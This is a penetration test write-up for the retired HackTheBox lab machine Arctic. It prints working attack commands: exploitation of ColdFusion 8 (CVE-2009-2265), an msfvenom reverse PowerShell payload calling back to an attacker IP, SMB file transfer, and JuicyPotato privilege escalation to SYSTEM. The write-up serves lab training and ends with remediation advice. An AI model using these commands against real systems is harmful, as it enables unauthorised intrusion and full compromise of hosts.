# HTB Arctic - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-1-12

---

## 0. Lesson Learned

Rely on your own notes - especially if you have seen something like this before.

---

## 1. Executive Summary

A penetration test was conducted against the target host *Arctic* to assess its security posture. The assessment identified a vulnerable and outdated Adobe ColdFusion service that allowed remote command execution, leading to an initial foothold. Further misconfigurations enabled privilege escalation to SYSTEM-level access.

Complete compromise of the system was achieved, demonstrating critical risk to the target environment.

---

## 2. Scope

- **Target:** 10.129.1.125
- **Environment:** HackTheBox Arctic (Retired Machine)
- **Testing Window:** 2026-1-9
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was performed to identify exposed services:

```
nmap -p- -sCV 10.129.1.125 -T4 -oA arctic_initial
```

**Results:**
- 135/tcp - Microsoft Windows RPC
- 8500/tcp - HTTP (JRun Web Server)
- 49154/tcp - Microsoft Windows RPC

Port 8500 was selected for further investigation.

---

## 5. Enumeration

The HTTP service on port 8500 was manually browsed and directory listing was found to be enabled with observed directories:

- `/CFIDE`
- `/cfdocs`

Accessing the following URL revealed a ColdFusion Administrator portal:

```
http://10.129.1.125:8500/CFIDE/Administrator
```

The application version was identified as **Adobe ColdFusion 8**, a version known to contain multiple critical vulnerabilities.

Exploit research was conducted using Exploit Database, identifying a Remote Command Execution vulnerability applicable to this version.

---

## 6. Initial Access

A ColdFusion 8 Remote Command Execution vulnerability (CVE-2009-2265) was exploited using public exploit **EDB-50057**.

The exploit script was modified to match the attacker IP, listener port, and target host and then run with:

```
python3 50057.py
```

After execution a reverse shell was obtained as `arctic\tolis` with shell context `C:\ColdFusion\runtime\bin`.

---

## 7. Post-Exploitation

System enumeration was performed identifying the operating system as **Microsoft Windows Server 2008 R2 Standard Build 7600**:

```
systeminfo
```

Privilege enumeration identified **SeImpersonatePrivilege** as enabled:

```
whoami /priv
```

Credential harvesting was attempted but did not yield results.

Based on OS version and privileges, token impersonation with *JuicyPotato* or *RottenPotatoNG* was identified as the most reliable escalation vector.

---

## 8. Privilege Escalation

JuicyPotato was selected due to compatibility with Windows Server 2008 R2 and enabled `SeImpersonatePrivilege`.

A reverse shell payload was generated:

```
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.16 lport=9999 > shell.bat
```

An SMB server was started on the attacker machine to transfer required files:

```
impacket-smbserver TMP /root/htb/arctic -smb2support
```

Files were copied to a writeable directory (`C:\Users\Public`) on the target:

```
copy \\10.10.14.16\TMP\JuicyPotato.exe

copy \\10.10.14.16\TMP\shell.bat
```

A listener was started on the attacker machine:

```
nc -lnvp 9999
```

JuicyPotato was executed to spawn a SYSTEM shell:

```
JuicyPotato.exe -t * -p shell.bat -l 4444
```

A reverse shell was received as **NT AUTHORITY\SYSTEM**.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\tolis\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 10. Findings & Recommendations

### Outdated Adobe ColdFusion 8 (Critical)

**Impact:** Allows unauthenticated remote command execution.

**Recommendation:** Upgrade to a supported ColdFusion version, restrict administrative endpoints, and disable directory listing.

### Excessive Privileges - SeImpersonatePrivilege (High)

**Impact:** Allowed privilege escalation to SYSTEM via token impersonation.

**Recommendation:** Restrict token privileges and apply least-privilege principles. Ensure OS is fully patched.

---

## 11. Appendix

ColdFusion 8 Remote Command Execution vulnerability (CVE-2009-2265):
[https://www.exploit-db.com/exploits/50057](https://www.exploit-db.com/exploits/50057)

JuicyPotato SeImpersonatePrivilege Tool for Mid-era Windows (7/2008/2012):
[https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)